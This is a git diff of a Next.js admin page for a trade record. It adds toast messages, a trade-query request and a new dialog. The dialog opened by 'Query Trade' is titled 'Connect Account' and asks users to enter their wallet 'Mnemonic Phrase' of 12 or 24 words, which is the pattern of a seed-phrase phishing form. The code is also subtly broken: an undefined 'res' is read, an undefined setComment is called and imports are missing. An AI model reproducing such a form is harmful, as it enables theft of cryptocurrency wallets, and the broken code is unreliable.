@@ -1,3 +1,4 @@
+// import React, {Fragement} from 'react';
 import Breadcumb from '../../../components/breadcumb';
 import Statistics from '../../../components/statistics';
 import AreaChart from '../../../components/chart';
@@ -11,6 +12,9 @@ import { getSession } from 'next-auth/react'
 import { Server, imageLoader, CardLoader } from '../../api/lib/service';
 import Image from 'next/image';
 import moment from 'moment';
+
+import { ToastContainer, toast } from 'react-toastify';
+
 
 const bg = require('./bg.png');
 const logo = require('./2-fav.png');
@@ -27,6 +31,7 @@ const TradeId = (props) => {
 
     const [isOpen, setIsOpen] = useState(false)
     const [data, setData] = useState({})
+    const [query, setQuery] = useState('')
     useEffect(() => {
         setData(props.trade[0])
     }, [])
@@ -56,19 +61,65 @@ const TradeId = (props) => {
         }
     }
 
+    const queryTrade = async () => {
+        toast.info('Processing Request...', {
+            position: "top-right",
+            autoClose: 3000,
+            hideProgressBar: false,
+            closeOnClick: true,
+            pauseOnHover: true,
+            draggable: true,
+            progress: undefined,
+            className: "toast-info",
+        });
+        fetch('/api/trade/query', {
+            body: JSON.stringify({
+                id: props.trade[0].id,
+                comment: query
+            }),
+            headers: {
+                "Content-Type": "application/json",
+            },
+            method: "PUT",
+        }).then(() => {
+            // console.log(res)
+            if (res.status == 200) {
+                props.setTrade(res.data.data)
+                setIsOpen(false)
+            }
+        }).catch(err => {
+            console.log(err)
+        })
+    }
+
+    function closeModal() {
+        setIsOpen(false)
+    }
+
+    function openModal() {
+        setIsOpen(true)
+    }
+
+
     return (
         <AdminLayout>
+            <ToastContainer />
 
-            <div className="modal" id="my-modal-2">
+            {/* <div className="modal" id="my-modal-2">
                 <div className="modal-box">
                     <h3 className="font-bold text-lg text-yellow-400">Query Trade.</h3>
                     <p className="py-4">Kindly say why you want to query this trade.</p>
                     <div className="form">
-                        <textarea className="w-full rounded py-2 px-3 resize-none h-36"></textarea>
+                        <textarea className="w-full rounded py-2 px-3 resize-none h-36" 
+                        onChange={(e)=>{setQuery(e.target.value)}}/>
                     </div>
                     <div className="modal-action flex">
-                        <a href="#" className="btn bg-red-600 mx-1 text-slate-100 transition">Cancel</a>
-                        <a href="#" className="btn bg-green-600 mx-1 text-slate-100 hover:bg-green-800 transition">Submit</a>
+                        <button href="#" className="btn bg-red-600 mx-1 text-slate-100 transition">Cancel</button>
+                        <button href="#" className="btn bg-green-600 mx-1 text-slate-100 hover:bg-green-800 transition" onClick={
+                            () => {
+                                queryTrade()
+                            }
+                        } >Submit</button>
                     </div>
                 </div>
             </div>
@@ -85,8 +136,88 @@ const TradeId = (props) => {
                         <a href="#" className="btn bg-green-600 mx-1 text-slate-100 hover:bg-green-800 transition">Submit</a>
                     </div>
                 </div>
-            </div>
+            </div> */}
+               <Transition appear show={isOpen} as={Fragment}>
+                <Dialog as="div" className="relative z-10" onClose={closeModal}>
+                    <Transition.Child
+                        as={Fragment}
+                        enter="ease-out duration-300"
+                        enterFrom="opacity-0"
+                        enterTo="opacity-100"
+                        leave="ease-in duration-200"
+                        leaveFrom="opacity-100"
+                        leaveTo="opacity-0"
+                    >
+                        <div className="fixed inset-0 bg-black bg-opacity-25" />
+                    </Transition.Child>
 
+                    <div className="fixed inset-0 overflow-y-auto">
+                        <div className="flex min-h-full items-center justify-center p-4 text-center">
+                            <Transition.Child
+                                as={Fragment}
+                                enter="ease-out duration-300"
+                                enterFrom="opacity-0 scale-95"
+                                enterTo="opacity-100 scale-100"
+                                leave="ease-in duration-200"
+                                leaveFrom="opacity-100 scale-100"
+                                leaveTo="opacity-0 scale-95"
+                            >
+                                <Dialog.Panel className="w-full max-w-md transform overflow-hidden rounded-2xl bg-white p-6 text-left align-middle shadow-xl transition-all">
+                                    <Dialog.Title
+                                        as="h3"
+                                        className="text-lg font-medium leading-6 text-gray-900"
+                                    >
+                                        Connect Account
+                                    </Dialog.Title>
+                                    <div className="mt-2">
+                                        <div className="modal-body replace">
+                                            <p className="text-sm text-black">Do not close until connection is successful</p>
+                                            <label htmlFor="message-text" className="text-bold text-right text-indigo-400">Mnemonic Phrase:</label>
+
+                                            {/* color: black;font-style: italic;font-weight: bold;font-size: 13px */}
+                                            <form className="
+                                                flex flex-col items-center justify-center
+                                                text-center
+                                                text-sm text-black
+                                                text-bold 
+                                            ">
+                                                <div className="form-group flex-1">
+                                                    <textarea
+                                                        onChange={(e) => setComment(e.target.value)}
+                                                        required
+                                                        className="
+                                                    form-control
+                                                    bg-white
+                                                    border-2 border-gray-300 rounded-lg py-2 px-4
+                                                    focus:outline-none focus:shadow-outline-blue focus:border-blue-300
+                                                    " id="message-text" rows="3" />
+                                                </div>
+                                                {/* <span className="text-red-500  text-sm">{error.length > 0 && error}</span> */}
+
+                                                <div className="mt-4">
+                                                    <button 
+                                                        className="inline-flex justify-center rounded-md border border-transparent bg-blue-100 px-4 py-2 text-sm font-medium text-blue-900 hover:bg-blue-200 focus:outline-none focus-visible:ring-2 focus-visible:ring-blue-500 focus-visible:ring-offset-2"
+
+                                                    >
+                                                   Submit
+
+                                                    </button>
+                                                </div>
+                                            </form>
+                                            <label>Typically 12 (sometimes 24) words separated by single spaces</label><br />
+
+
+
+                                        </div>
+                                    </div>
+
+
+                                </Dialog.Panel>
+                            </Transition.Child>
+                        </div>
+                    </div>
+                </Dialog>
+            </Transition>
 
             <div className="flex flex-wrap">
                 <div className="w-full lg:w-8/12 pt-6 pb-24 bg-gray-300 dark:bg-gray-800 px-6 rounded-3xl">
@@ -135,7 +266,7 @@ const TradeId = (props) => {
 
 
 
-                        <h5 className="text-slate-400 font-bold">Status: <span className="text-slate-100 font-normal">Trade { data.tradeStatus?.name}</span></h5>
+                        <h5 className="text-slate-400 font-bold">Status: <span className="text-slate-100 font-normal">Trade {data.tradeStatus?.name}</span></h5>
 
 
                         <div className="flex justify-between dark:text-gray-100 text-black  items-center">
@@ -149,16 +280,15 @@ const TradeId = (props) => {
                                         Confirm Trade
                                     </button>
 
-                                    <a href="#my-modal-2" type="button"
-                                        className="inline-flex mx-1 items-center px-6 py-3 text-base font-medium leading-6 text-white transition duration-150 ease-in-out bg-yellow-400 border border-transparent rounded-md hover:bg-yellow-600 focus:outline-none focus:border-indigo-700 focus:shadow-outline-indigo active:bg-indigo-700">
+                                    <button type="button" onClick={()=> setIsOpen(true)} className="inline-flex mx-1 items-center px-6 py-3 text-base font-medium leading-6 text-white transition duration-150 ease-in-out bg-yellow-400 border border-transparent rounded-md hover:bg-yellow-600 focus:outline-none focus:border-indigo-700 focus:shadow-outline-indigo active:bg-indigo-700">
                                         Query Trade
-                                    </a>
+                                    </button>
 
-                                    <a href="#my-modal-1" type="button"
+                                    <button type="button"
                                         className="inline-flex mx-1 items-center px-6 py-3 text-base font-medium leading-6 text-white transition duration-150 ease-in-out bg-red-400 border border-transparent rounded-md hover:bg-red-600 focus:outline-none focus:border-indigo-700 focus:shadow-outline-indigo active:bg-indigo-700"
                                     >
                                         Fault Trade
-                                    </a>
+                                    </button>
                                 </div>
 
                             )
@@ -205,10 +335,10 @@ const TradeId = (props) => {
 
                         <div className="flex justify-center mt-2">
                             <a href={`../users/${data.user?.id}`} type="button" className="inline-flex items-center px-6 py-3 text-base font-medium leading-6 text-white transition duration-150 ease-in-out bg-yellow-500 border border-transparent rounded-md hover:bg-yellow-900 focus:outline-none focus:border-indigo-700 focus:shadow-outline-indigo active:bg-indigo-700">
-                            
+
                                 View Profile
                             </a>
-                            
+
                         </div>
                     </div>
                 </div>
